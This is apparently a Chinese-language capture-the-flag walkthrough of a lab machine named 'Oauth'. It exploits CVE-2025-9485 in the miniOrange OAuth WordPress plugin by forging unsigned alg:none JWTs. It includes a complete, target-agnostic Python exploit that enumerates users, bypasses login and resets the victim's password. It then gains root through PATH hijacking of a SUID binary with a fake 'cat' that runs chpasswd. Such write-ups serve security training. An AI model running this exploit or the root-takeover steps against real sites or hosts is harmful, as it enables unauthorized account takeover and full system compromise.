# 信息收集

```bash
IP=192.168.205.208
```

对目标做端口和服务探测。

```bash
nmap -sV -sC -p 22,80,8080 $IP
```

```
22/tcp   open  ssh        OpenSSH 10.3
80/tcp   open  http       Apache/2.4.67 (Unix)
8080/tcp open  http-proxy
```

80 是 Apache，8080 访问后发现是 Keycloak 登录页。SSH 版本太新没什么搞头。

访问 80 端口是个 WordPress，域名 `oauth.dsz`，加 hosts。

```bash
echo "$IP oauth.dsz" >> /etc/hosts
```

WordPress 登录页有个 "Login with Keycloak" 的 OAuth 按钮，翻源码看看用的什么插件。

```bash
curl -s http://oauth.dsz/wp-login.php | grep miniorange
```

```
/wp-content/plugins/miniorange-login-with-eve-online-google-facebook/css/login-page.min.css?ver=6.26.11
```

miniOrange OAuth Single Sign On 插件，版本 `6.26.11`。查了一下 WPScan 漏洞库，这个版本命中 CVE-2025-9485（OAuth Single Sign On < 6.26.13 Authentication Bypass）。

触发 OAuth 跳转看一下 OIDC 参数。

```bash
curl -sI "http://oauth.dsz/?option=oauthredirect&app_name=keycloak"
```

302 跳到 Keycloak 授权端点，从 Location 里提取到：realm 为 `wordpress-site`，client_id 为 `wordpress-client`，response_type 为 `id_token`，response_mode 为 `form_post`。这些参数构造 payload 时要用到。

# CVE-2025-9485 漏洞利用

## 漏洞原理

正常 OIDC 流程中，WordPress 插件收到 Keycloak 返回的 `id_token` 后，应该用 IdP 的公钥验证 JWT 签名，确认 token 确实由可信的 Keycloak 签发。CVE-2025-9485 的问题在于 miniOrange 插件的 `get_resource_owner_from_id_token()` 函数没有正确校验 JWT 的 `alg` 字段。当攻击者把 JWT header 的 `alg` 设为 `none` 时，插件跳过签名验证，直接信任 payload 里的用户身份信息并下发 WordPress 登录 Cookie。

公开参考仓库：https://github.com/jFriedli/CVE-2025-9485

该仓库给出了通用的理论方向：构造 `alg:none` 的无签名 JWT，把伪造的 `id_token` 提交给 WordPress 回调地址，检查响应中是否出现 `wordpress_logged_in` Cookie。但它是个通用 PoC 草稿，不能直接照搬到当前靶机，原因是：

- 当前靶机使用 `response_mode=form_post`，`id_token` 需要以 POST 表单方式提交到回调地址，不是拼在 URL query 里
- 必须先触发一次真实的 OAuth 跳转，从中提取插件生成的 `state` 和 `nonce`，否则回调会被拒绝
- JWT payload 中的 `iss` 必须匹配 `http://oauth.dsz:8080/realms/wordpress-site`，`aud`/`azp` 必须匹配 `wordpress-client`

## 利用流程

手工走一遍完整的利用链：

1. 请求 OAuth 入口，让插件生成会话并拿到 `state` 和 `nonce`：

```bash
curl -sI "http://oauth.dsz/?option=oauthredirect&app_name=keycloak"
```

从 302 Location 里提取 `state=xxx&nonce=yyy`。

2. 构造 `alg=none` 的伪造 JWT。header 部分：

```json
{"typ":"JWT","alg":"none"}
```

payload 部分（关键字段）：

```json
{
  "iss": "http://oauth.dsz:8080/realms/wordpress-site",
  "aud": "wordpress-client",
  "azp": "wordpress-client",
  "preferred_username": "yepian",
  "email": "yepian@oauth.dsz",
  "email_verified": true,
  "nonce": "<从步骤1拿到的nonce>",
  "exp": <当前时间+3600>
}
```

将 header 和 payload 分别 base64url 编码，用 `.` 拼接，末尾再加一个 `.`（空签名），得到最终的 token。

3. POST 到 WordPress 回调：

```
POST http://oauth.dsz/
Content-Type: application/x-www-form-urlencoded

id_token=<伪造JWT>&state=<步骤1的state>
```

4. 响应中出现 `Set-Cookie: wordpress_logged_in_...` 即代表认证绕过成功。

## 自动化利用

整个流程我写成了脚本，保存为 `exp.py`。

```python
#!/usr/bin/env python3
import argparse
import base64
import html
import json
import random
import re
import secrets
import string
import time
import urllib.parse

import requests


R = "\033[91m"
G = "\033[92m"
Y = "\033[93m"
C = "\033[96m"
B = "\033[1m"
E = "\033[0m"


def b64url(d):
    return base64.urlsafe_b64encode(d).rstrip(b"=").decode()


def jwt_none(claims):
    return b64url(json.dumps({"typ":"JWT","alg":"none"},separators=(",",":")).encode()) + "." + b64url(json.dumps(claims,separators=(",",":")).encode()) + "."


def rand_pw():
    a = string.ascii_letters + string.digits + "!@#$%&*"
    while True:
        p = "".join(secrets.choice(a) for _ in range(20))
        if any(c.islower() for c in p) and any(c.isupper() for c in p) and any(c.isdigit() for c in p) and any(c in "!@#$%&*" for c in p):
            return p


def parse_url(raw):
    if not raw.startswith("http://") and not raw.startswith("https://"):
        raw = "http://" + raw
    p = urllib.parse.urlparse(raw)
    return p.scheme, p.hostname or "", p.port or (443 if p.scheme == "https" else 80)


def get_wp_host(scheme, ip, port):
    try:
        base = f"{scheme}://{ip}" if port in (80, 443) else f"{scheme}://{ip}:{port}"
        r = requests.get(base + "/", allow_redirects=False, timeout=8)
        loc = r.headers.get("Location", "")
        if loc:
            p = urllib.parse.urlparse(loc)
            if p.hostname and p.hostname != ip:
                return f"{p.hostname}:{p.port}" if p.port and p.port not in (80, 443) else p.hostname
    except:
        pass
    return ip if port in (80, 443) else f"{ip}:{port}"


def mkurl(scheme, ip, port, path="/"):
    return (f"{scheme}://{ip}" if port in (80, 443) else f"{scheme}://{ip}:{port}") + path


def check_vuln(s, scheme, ip, port):
    body = s.get(mkurl(scheme, ip, port, "/wp-login.php"), timeout=10).text
    body += s.get(mkurl(scheme, ip, port, "/"), timeout=10).text
    slug = "miniorange-login-with-eve-online-google-facebook"
    if slug not in body:
        return None, None
    ver = re.findall(slug + r"/[^?]+\?ver=([0-9.]+)", body)
    version = max(ver, key=lambda v: tuple(int(x) for x in v.split("."))) if ver else None
    if version and tuple(int(x) for x in version.split(".")) >= (6, 26, 13):
        return version, False
    apps = list(dict.fromkeys(urllib.parse.unquote(m.group(1)) for m in re.finditer(r"[?&]app_name=([^&'\"<>\s]+)", body)))
    for a in ["keycloak", "openid", "oauth"]:
        if a not in apps:
            apps.append(a)
    for app in apps:
        try:
            r = s.get(mkurl(scheme, ip, port, f"/?option=oauthredirect&app_name={app}"), allow_redirects=False, timeout=10)
        except:
            continue
        if r.status_code in (301, 302, 303, 307, 308) and "openid-connect/auth" in r.headers.get("Location", ""):
            return version, app
    return version, None


def get_users(s, scheme, ip, port):
    try:
        r = s.get(mkurl(scheme, ip, port, "/index.php?rest_route=/wp/v2/users"), timeout=10)
        data = r.json()
        if isinstance(data, list):
            return [u["slug"] for u in data if u.get("slug")]
    except:
        pass
    return []


def exploit(s, scheme, ip, port, app, username, email):
    r = s.get(mkurl(scheme, ip, port, f"/?option=oauthredirect&app_name={app}"), allow_redirects=False, timeout=10)
    loc = r.headers.get("Location", "")
    params = {k: v[0] for k, v in urllib.parse.parse_qs(urllib.parse.urlparse(loc).query).items()}
    parsed = urllib.parse.urlparse(loc)
    realm = re.search(r"/realms/([^/]+)/", parsed.path)
    issuer = f"{parsed.scheme}://{parsed.netloc}/realms/{realm.group(1)}" if realm else ""
    client_id, nonce, state = params.get("client_id", ""), params.get("nonce", ""), params.get("state", "")
    redirect_uri = params.get("redirect_uri", "/")
    now = int(time.time())
    claims = {"iss": issuer, "aud": client_id, "azp": client_id, "sub": f"f-{username}-{random.randint(1000,9999)}", "preferred_username": username, "email": email, "email_verified": True, "name": username, "iat": now, "nbf": now, "exp": now + 3600}
    if nonce:
        claims["nonce"] = nonce
    token = jwt_none(claims)
    cb = urllib.parse.urlparse(redirect_uri).path or "/"
    s.post(mkurl(scheme, ip, port, cb), data={"id_token": token, "state": state}, allow_redirects=False, timeout=10)
    if any(n.startswith("wordpress_logged_in") for n in s.cookies.get_dict()):
        return True
    s.get(mkurl(scheme, ip, port, cb + "?" + urllib.parse.urlencode({"id_token": token, "state": state})), allow_redirects=False, timeout=10)
    return any(n.startswith("wordpress_logged_in") for n in s.cookies.get_dict())


def change_pw(s, scheme, ip, port, username, pw):
    r = s.get(mkurl(scheme, ip, port, "/wp-admin/profile.php"), timeout=10)
    if r.status_code != 200:
        return False
    fields = {}
    for m in re.finditer(r'<input[^>]*name=["\']([^"\']+)["\'][^>]*value=["\']([^"\']*)["\']', r.text, re.I):
        fields[m.group(1)] = html.unescape(m.group(2))
    for m in re.finditer(r'<input[^>]*value=["\']([^"\']*)["\'][^>]*name=["\']([^"\']+)["\']', r.text, re.I):
        fields[m.group(2)] = html.unescape(m.group(1))
    fields.update({"action": "update", "pass1": pw, "pass2": pw, "pw_weak": "on", "submit": "Update Profile"})
    if not fields.get("display_name"):
        fields["display_name"] = username
    r = s.post(mkurl(scheme, ip, port, "/wp-admin/profile.php"), data=fields, allow_redirects=False, timeout=10)
    return "updated=1" in r.headers.get("Location", "") or "updated=true" in r.headers.get("Location", "")


def main():
    parser = argparse.ArgumentParser(description="CVE-2025-9485 | miniOrange OAuth Single Sign On < 6.26.13 Authentication Bypass")
    parser.add_argument("url", help="http://target or target IP")
    args = parser.parse_args()

    scheme, ip, port = parse_url(args.url)
    host = get_wp_host(scheme, ip, port)
    s = requests.Session()
    s.headers.update({"Host": host})

    print(f"{C}[*]{E} Target: {B}{scheme}://{ip}:{port}{E} (Host: {host})")
    version, app = check_vuln(s, scheme, ip, port)
    if app is None:
        print(f"{R}[-]{E} Not vulnerable. Plugin version: {version or 'not found'}")
        return
    print(f"{G}[+]{E} Plugin version: {Y}{version or 'unknown'}{E} | app_name: {Y}{app}{E}")
    print(f"{G}[+]{E} {R}{B}Vulnerable to CVE-2025-9485{E}")

    users = get_users(s, scheme, ip, port)
    if not users:
        print(f"{R}[-]{E} No public users found")
        u = input(f"{Y}[?]{E} Enter username: ").strip()
        if not u:
            return
        users = [u]
    else:
        print(f"{C}[*]{E} Users: {', '.join(users)}")
        for i, u in enumerate(users):
            print(f"  {C}[{i}]{E} {u}")
        c = input(f"{Y}[?]{E} Select user [0-{len(users)-1}]: ").strip()
        if not c.isdigit() or int(c) >= len(users):
            return
        users = [users[int(c)]]

    username = users[0]
    email = f"{username}@{host.split(':')[0]}"
    print(f"{C}[*]{E} Exploiting: {B}{username}{E} ({email})")

    if not exploit(s, scheme, ip, port, app, username, email):
        print(f"{R}[-]{E} Failed, no login cookie")
        return
    print(f"{G}[+]{E} {G}Auth bypass success!{E}")

    pw = rand_pw()
    if change_pw(s, scheme, ip, port, username, pw):
        print(f"{G}[+]{E} {G}Password changed!{E}")
        print(f"    {B}URL:{E}      {scheme}://{host}/wp-login.php")
        print(f"    {B}Username:{E} {username}")
        print(f"    {B}Password:{E} {R}{pw}{E}")
    else:
        print(f"{R}[-]{E} Password change failed")


if __name__ == "__main__":
    main()
```

跑一下。

```bash
python3 exp.py http://$IP
```

```
[*] Target: http://192.168.205.208:80 (Host: oauth.dsz)
[+] Plugin version: 6.26.11 | app_name: keycloak
[+] Vulnerable to CVE-2025-9485
[*] Users: yepian
  [0] yepian
[?] Select user [0-0]: 0
[*] Exploiting: yepian (yepian@oauth.dsz)
[+] Auth bypass success!
[+] Password changed!
    URL:      http://oauth.dsz/wp-login.php
    Username: yepian
    Password: aK7#mR2xLp9&wQ4vBnYs
```

脚本自动完成了漏洞检测、`state/nonce` 获取、JWT 伪造、回调提交、密码修改全流程。用输出的凭证登录 WordPress 后台。

# WordPress 后台获取 SSH 密钥

进到后台翻文章列表，发现一篇标题为 "My Secret" 的私密文章，内容是完整的 OpenSSH 私钥。保存下来连 SSH。

```bash
vim id_rsa
chmod 600 id_rsa
ssh -i id_rsa yepian@$IP
```

```
yepian@Oauth:~$ id
uid=102(yepian) gid=103(yepian) groups=103(yepian)
```

拿到 yepian 的 shell。

# 本地提权

## SUID 二进制分析

```bash
find / -perm -4000 2>/dev/null
```

```
/opt/scripts/CheckSystem
```

`/opt/scripts/` 下有个 SUID root 的二进制 `CheckSystem`，旁边 plugins 目录下两个 `.sh` 脚本当前用户没有读权限。用 strings 看一下。

```bash
strings /opt/scripts/CheckSystem | grep "for "
```

```
for f in /opt/scripts/plugins/*.sh; do /bin/bash "$f"; done;
```

把它拖回来反编译确认 main 函数逻辑。

```c
int main() {
  setuid(0);
  setgid(0);
  system("for f in /opt/scripts/plugins/*.sh; do /bin/bash \"$f\"; done;");
  return 0;
}
```

`setuid(0)` 提到 root 后直接 `system()` 执行 shell 命令，而 `system()` 会继承调用者的 PATH 环境变量。虽然 plugins 目录写不进去，但只要脚本内部调用的命令没用绝对路径就能劫持。

## 进程监控确认劫持目标

执行 CheckSystem 的同时用进程监控抓以 UID=0 运行的子命令。

```bash
/opt/scripts/CheckSystem
```

```
CMD: UID=0  PID=26704  | cat /var/mail/yepian/message.md
CMD: UID=0  PID=26706  | ps -ef
CMD: UID=0  PID=26708  | grep -v grep
```

CheckMail.sh 调了 `cat`，CheckServices.sh 调了 `ps` 和 `grep`，全部没写绝对路径。

## PATH 劫持提权

在 home 目录下创建恶意 `cat`，保存为 `~/cat`：

```bash
#!/bin/bash
echo "root:root123" | chpasswd;
echo "123456"
```

```bash
chmod +x ~/cat
PATH=~:$PATH /opt/scripts/CheckSystem
```

```
Fetching Message...
================================================
= From:cxzlw   To:yepian =
123456
================================================
Checking Services...
KeyCloak Alive!
WordPress Alive!
```

`cat` 被劫持，root 密码已改为 `root123`。

```bash
yepian@Oauth:~$ su -
Password: root123
root@Oauth:~# id
uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

# Flag

```bash
root@Oauth:~# cat /home/yepian/user.txt /root/root.txt
flag{user-UserFlag}
flag{root-RootFlag}
```